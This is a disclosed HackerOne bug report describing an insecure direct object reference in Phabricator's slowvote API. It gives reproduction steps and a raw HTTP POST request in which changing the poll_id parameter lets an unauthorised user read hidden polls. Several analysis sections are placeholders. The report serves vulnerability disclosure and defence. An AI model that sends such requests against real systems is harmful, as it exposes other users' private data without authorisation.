# IDOR bug to See hidden slowvote of any user even when you dont have access right

## Metadata
- **Source:** HackerOne
- **Report:** 661978 | https://hackerone.com/reports/661978
- **Submitted:** 2019-07-27
- **Reporter:** ranjit_p
- **Program:** Unknown
- **Bounty:** $300
- **Severity:** unknown
- **Vuln:** Insecure Direct Object Reference (IDOR)
- **CVEs:** None
- **Category:** web-api

## Summary
USER ACCOUNT
=============
1. user A (who create slowvote)
2. User B (Dont have permissioon to see above slowvote)
3. User C (has permission to see above slowvote)

STEP TO REPRODUCE
==================
1. From user A account goto http://phabricator.localhost.com/vote/create/ and create a slowvote .
   Change this slowvote "Visible To" to "No one" or to user C .
  Slowvote url will be now like http

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

USER ACCOUNT
=============
1. user A (who create slowvote)
2. User B (Dont have permissioon to see above slowvote)
3. User C (has permission to see above slowvote)

STEP TO REPRODUCE
==================
1. From user A account goto http://phabricator.localhost.com/vote/create/ and create a slowvote .
   Change this slowvote "Visible To" to "No one" or to user C .
  Slowvote url will be now like http://phabricator.localhost.com/V1 .

2. Now user B visit above slowvote url http://phabricator.localhost.com/V1 and see that he dont have access permission .
Now user B sent bellow request and can see any hidden slowvote 

```
POST /api/slowvote.info HTTP/1.1
Host: phabricator.localhost.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 83
Connection: close
Cookie: phsid=smpm4rp6yltbzna3qda2nwbomsoidzwjfshkkw7v; phusr=admin
Upgrade-Insecure-Requests: 1

__csrf__=B%40wmnrkyq3468c99179280354c&__form__=1&params%5Bpoll_id%5D=1&output=human
```
here just change poll_id parameter value to your target poll id and see that hidden poll

## Impact

Fix this

</details>

---
*Analysed by Claude on 2026-05-24*
